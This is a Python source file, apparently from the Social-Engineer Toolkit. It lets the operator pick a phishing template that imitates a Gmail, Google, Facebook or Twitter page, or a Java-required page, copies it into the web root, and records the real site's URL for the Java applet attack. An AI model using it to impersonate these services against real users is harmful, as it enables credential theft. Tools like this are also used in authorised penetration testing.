#!/usr/bin/env python
import subprocess,os
from src.core import setcore as core
#
# used for pre-defined templates
#
print """
  1. Java Required 
  2. Gmail
  3. Google
  4. Facebook
  5. Twitter
"""
choice=raw_input(core.setprompt(["2"],"Select a template"))

if choice == "exit":
    core.ExitSet()

# file used for nextpage in java applet attack
filewrite=file("src/program_junk/site.template", "w")

# if nothing is selected
if choice == "": choice = "1"

# if java required
if choice == "1":
	subprocess.Popen("cp src/html/templates/java/index.template src/html/ 1> /dev/null 2> /dev/null", shell=True).wait()
	URL=""

# if gmail
if choice == "2":
	subprocess.Popen("cp src/html/templates/gmail/index.template src/html/ 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="https://gmail.com"

# if google
if choice == "3":
	subprocess.Popen("cp src/html/templates/google/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.google.com"

# if facebook
if choice == "4":
	subprocess.Popen("cp src/html/templates/facebook/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.facebook.com"

# if twitter
if choice == "5":
	subprocess.Popen("cp src/html/templates/twitter/index.template src/html 1> /dev/null 2> /dev/null", shell=True).wait()
	URL="http://www.twitter.com"

subprocess.Popen("mkdir src/program_junk/web_clone 1> /dev/null 2>/dev/null;cp src/html/index.template src/program_junk/web_clone/index.html", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

filewrite.write("TEMPLATE=SELF" + "\n"+"URL=%s" % (URL))
filewrite.close()
